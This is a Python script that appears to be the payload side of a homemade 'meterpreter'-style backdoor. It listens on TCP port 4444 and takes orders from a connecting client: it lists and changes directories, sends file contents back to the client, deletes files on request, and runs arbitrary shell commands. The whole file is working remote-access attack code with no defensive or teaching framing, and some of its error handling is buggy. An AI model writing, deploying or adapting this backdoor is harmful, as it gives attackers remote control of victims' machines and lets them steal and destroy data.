from socket import *
from subprocess import check_output as c
from colorama import Fore as f 
import os
from config import Config

ip = "HOST IP ADDRESS"
port = 4444


cmds = ['dir','ls']


tcp = socket(AF_INET,SOCK_STREAM)

tcp.bind((ip, port))

tcp.listen()
client, addr = tcp.accept()

while True:
    global msg
    try:
        a = client.recv(1024).decode()
        if a == 'meterpreter started':
            client.sendall((f'CWD PAYLOAD {os.getcwd()}::::::::::meterpreter').encode())
        elif a != 'meterpreter started':
            if a in cmds:
                if a in ['dir','ls']:
                    msg = ""
                    list_of_dir = os.listdir()
                    for i in list_of_dir:
                        msg += f'{f.GREEN}    [*] {f.WHITE}{i}\n'
            elif a.startswith('cd'):
                try:
                    os.chdir(a.replace('cd ',''))
                    msg = 'cd successfully'
                except:
                    msg = 'cd successfully'
                    pass
            elif a == 'exit':
                client.close()
            elif a.startswith('send '):
                with open(a.replace('send ',''),'rb') as file:
                    client.sendall(file.read(1024))
                    msg = ''
            elif a.startswith('rem'):
                os.remove(a.replace('rem ',''))
                msg = 'FILE DELETED #METERPRETER'
            else:
                try:msg = c(a).decode()
                except:pass
            try:msg = (f'CWD PAYLOAD {os.getcwd()}::::::::::{msg}').encode()
            except:pass
            client.sendall(msg)
            msg = ''
    except ConnectionAbortedError or ConnectionResetError:
        client, addr = tcp.accept()
        continue   